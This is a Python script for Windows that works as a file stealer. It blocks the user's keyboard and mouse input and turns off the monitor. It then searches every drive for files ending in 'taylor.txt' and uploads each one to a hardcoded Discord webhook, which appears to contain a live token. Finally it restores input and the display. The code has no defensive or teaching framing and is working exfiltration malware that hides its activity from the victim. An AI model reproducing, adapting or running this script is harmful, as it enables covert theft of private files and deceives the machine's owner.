import os
import requests
import time
import threading
import ctypes
import win32gui
import win32con

ctypes.windll.user32.BlockInput(True)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

# Replace with your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1116752197175222353/AyXcQi4PR8lGZPFSAMEaMl2kenrbU5F1isK3Mx_VoZwDU9Eejha3v0GDHDoibjm6hsq8"

def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            headers = {"User-Agent": "Mozilla/5.0"}  # Use a user agent to avoid Discord rate limits
            response = requests.post(WEBHOOK_URL, headers=headers, files=files)
            if response.status_code == 429:
                # Rate limit exceeded - wait for the specified time and retry the upload
                time.sleep(response.json()["retry_after"]/1000)
                upload_file(file_path)
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")
        
def search_files(root_dir):
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            if file.endswith('taylor.txt'):
                file_path = os.path.join(root, file)
                upload_file(file_path)

def thread_files(root_dirs):
    for root_dir in root_dirs:
        search_files(root_dir)
# Get a list of all available drives
drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
# Split the drives into groups of 4
drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]
# Search for files in each group in parallel
for group in drive_groups:
    threads = []
    for drive in group:
        thread = threading.Thread(target=search_files, args=(drive,))
        threads.append(thread)
        thread.start()
    # Wait for all threads to finish before moving on to the next group
    for thread in threads:
        thread.join()

ctypes.windll.user32.BlockInput(False)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)
